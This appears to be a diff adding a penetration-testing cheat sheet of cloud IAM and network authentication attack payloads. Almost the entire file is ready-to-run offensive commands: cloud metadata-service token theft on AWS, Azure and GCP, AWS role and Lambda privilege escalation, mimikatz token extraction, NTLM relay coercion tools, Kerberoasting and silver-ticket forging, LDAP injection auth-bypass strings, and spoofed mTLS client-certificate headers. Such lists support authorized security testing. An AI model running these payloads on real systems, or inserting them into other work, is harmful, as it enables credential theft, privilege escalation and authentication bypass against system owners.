@@ -1,0 +1,68 @@
+# Cloud IAM & Network Auth Payloads
+
+## AWS IAM Escalation
+# Confused Deputy - missing ExternalId
+aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/cross-account-role --role-session-name test
+# Lambda privilege escalation
+aws lambda create-function --function-name escalate --role arn:aws:iam::ACCOUNT:role/admin-role --handler index.handler --runtime python3.9 --zip-file fileb://payload.zip
+# EC2 metadata token theft
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token
+
+## Azure AD / Entra ID
+# PRT extraction
+mimikatz # token::elevate
+mimikatz # dpapi::cloudapkd /keyvalue:VALUE /unprotect
+# Guest user abuse
+az ad user list --query "[?userType=='Guest']"
+az role assignment list --assignee GUEST_OBJECT_ID
+# Managed Identity token
+curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+## GCP IAM
+# Service Account impersonation
+gcloud auth print-access-token --impersonate-service-account=SA@PROJECT.iam.gserviceaccount.com
+# Metadata server token
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Default SA abuse
+gcloud projects get-iam-policy PROJECT_ID --flatten="bindings[].members" --filter="bindings.members:*-compute@developer.gserviceaccount.com"
+
+## NTLM Relay Coercion
+# PetitPotam
+python3 PetitPotam.py LISTENER_IP TARGET_IP
+# PrinterBug
+python3 printerbug.py DOMAIN/USER:PASS@TARGET_IP LISTENER_IP
+# DFSCoerce
+python3 dfscoerce.py -u USER -p PASS -d DOMAIN LISTENER_IP TARGET_IP
+# ShadowCoerce
+python3 shadowcoerce.py LISTENER_IP TARGET_IP
+
+## Kerberos
+# AS-REP Roasting
+impacket-GetNPUsers DOMAIN/ -usersfile users.txt -format hashcat -dc-ip DC_IP
+# Kerberoasting
+impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC_IP -request
+# Silver Ticket (cloud hybrid)
+impacket-ticketer -nthash NTLM_HASH -domain-sid S-1-5-21-... -domain DOMAIN -spn HTTP/target.domain.com admin
+
+## LDAP Injection
+# Auth bypass
+username: *)(uid=*))(|(uid=*
+password: anything
+# Filter injection
+(&(uid=admin)(|(password=*)))
+# Blind LDAP injection
+admin)(|(cn=*
+admin)(cn=a*
+admin)(cn=b*
+
+## RADIUS (Blast-RADIUS CVE-2024-3596)
+# MD5 collision in Access-Request
+# Requires: man-in-the-middle position between NAS and RADIUS server
+# Tool: blast-radius-attack (PoC)
+
+## mTLS Bypass Headers
+X-Forwarded-Client-Cert: Hash=AABB;Cert="...";Subject="CN=admin"
+X-Client-Cert: MIIBxTCCAW...
+X-SSL-Client-S-DN: CN=admin,O=Target
+X-SSL-Client-Verify: SUCCESS
